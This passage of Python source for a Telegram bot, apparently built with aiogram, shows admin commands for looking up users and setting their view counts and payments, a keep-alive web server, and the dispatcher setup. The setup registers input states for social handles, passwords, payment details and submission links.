            "⚠️ Format: <code>/info @username</code>\nExample: <code>/info @johndoe</code>"
        )
        return

    target_username = parts[1].strip()
    if not target_username.startswith("@"):
        target_username = f"@{target_username}"

    target_user = await db.get_user_by_username(target_username)
    if not target_user:
        await message.answer(f"❌ User <code>{html.escape(target_username)}</code> was not found.")
        return

    is_admin = bool(message.from_user and message.from_user.id in ADMIN_IDS)
    chat_id = target_user["chat_id"]
    socials = await db.get_user_social_accounts_full(chat_id)
    submissions = await db.get_user_submissions(chat_id)

    response_text = format_user_data_card(target_user, socials, submissions, is_admin)
    await message.answer(response_text, disable_web_page_preview=True)

# --- ADMIN COMMAND: UPDATE STATS ---
async def update_stats_command(message: types.Message):
    if not message.from_user or message.from_user.id not in ADMIN_IDS:
        await message.answer("⛔ You are not authorized to use this command.")
        return

    parts = (message.text or "").split()
    if len(parts) != 4:
        await message.answer(
            "⚠️ Incorrect usage.\nFormat: <code>/update @username views money</code>\nExample: <code>/update @johndoe 55000 100</code>"
        )
        return

    target_username = parts[1]
    if not target_username.startswith("@"):
        target_username = f"@{target_username}"
    try:
        new_views = int(parts[2])
        new_money = float(parts[3])
    except ValueError:
        await message.answer("⚠️ Views must be an integer and money must be a valid number.")
        return

    updated = await db.update_user_stats(target_username, new_views, new_money)

    if not updated:
        await message.answer(f"❌ User <code>{html.escape(target_username)}</code> not found in database.")
        return

    await message.answer(
        f"✅ Successfully updated stats for <b>{html.escape(target_username)}</b>:\n"
        f"👁 Views: <b>{new_views:,}</b>\n"
        f"💰 Money: <b>${new_money:.2f}</b>"
    )

# --- ADMIN COMMAND: SET SUBMISSION PAYMENT ---
async def set_pay_command(message: types.Message):
    if not message.from_user or message.from_user.id not in ADMIN_IDS:
        await message.answer("⛔ You are not authorized to use this command.")
        return

    parts = (message.text or "").split()
    if len(parts) != 3:
        await message.answer(
            "⚠️ Incorrect usage.\nFormat: <code>/setpay &lt;submission_id&gt; &lt;amount&gt;</code>\nExample: <code>/setpay 1 5.50</code>"
        )
        return

    try:
        sub_id = int(parts[1])
        amount = float(parts[2])
    except ValueError:
        await message.answer("⚠️ Submission ID must be an integer and amount must be a valid number.")
        return

    res = await db.update_submission_payment(sub_id, amount)
    if not res:
        await message.answer(f"❌ Submission ID <code>#{sub_id}</code> not found in database.")
        return

    user_chat_id = res["chat_id"]
    sub_link = res["link"]

    await message.answer(
        f"✅ Payment for Submission <code>#{sub_id}</code> updated to <b>${amount:.2f}</b>!"
    )

    try:
        await message.bot.send_message(
            user_chat_id,
            f"🎉 <b>Submission Payment Updated!</b>\n\n"
            f"Your submission (ID: #{sub_id}) has been reviewed!\n"
            f"🔗 <b>Link:</b> {html.escape(sub_link)}\n"
            f"💰 <b>Payment:</b> <b>${amount:.2f}</b>\n\n"
            f"You can check all your earnings under <b>🔗 Submission Links</b>.",
            disable_web_page_preview=True,
        )
    except Exception as e:
        logging.warning(f"Could not notify user {user_chat_id} about payment update: {e}")

# --- DUMMY WEB SERVER FOR RENDER FREE TIER ---
async def handle_ping(request):
    return web.Response(text="Bot is alive!")

async def start_web_server():
    app = web.Application()
    app.router.add_get("/", handle_ping)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get("PORT", 8080))
    site = web.TCPSite(runner, "0.0.0.0", port)
    await site.start()
    return runner

# --- MAIN SETUP ---
async def main():
    await db.connect()
    runner = await start_web_server()
    bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
    dp = Dispatcher()

    # Middlewares: Block users if they changed their Telegram username
    dp.message.outer_middleware(UsernameLockMiddleware())
    dp.callback_query.outer_middleware(UsernameLockMiddleware())

    # Commands
    dp.message.register(start_command, Command("start"))
    dp.message.register(update_stats_command, Command("update"))
    dp.message.register(set_pay_command, Command("setpay"))
    dp.message.register(info_command, Command("info"), Command("user"))

    # FSM Input States
    dp.message.register(process_username, BotStates.waiting_for_username)
    dp.message.register(process_handle, BotStates.entering_handle)
    dp.message.register(process_password, BotStates.entering_password)
    dp.message.register(process_payment_info, BotStates.entering_payment)
    dp.message.register(process_submission_link, BotStates.entering_submission_link)
    dp.message.register(process_inspect_user, BotStates.inspecting_user)

    # Callbacks
    dp.callback_query.register(
        menu_callback_router,
        F.data.startswith("menu_") | (F.data == "back_to_menu") | (F.data == "sub_new"),
    )
    dp.callback_query.register(platform_selected, F.data.startswith("plat_"))

    print("🤖 Bot is up and running...")
    try:
        await bot.delete_webhook(drop_pending_updates=True)
        await dp.start_polling(bot)
    finally:
        await runner.cleanup()
        await db.close()

if __name__ == "__main__":
    asyncio.run(main())
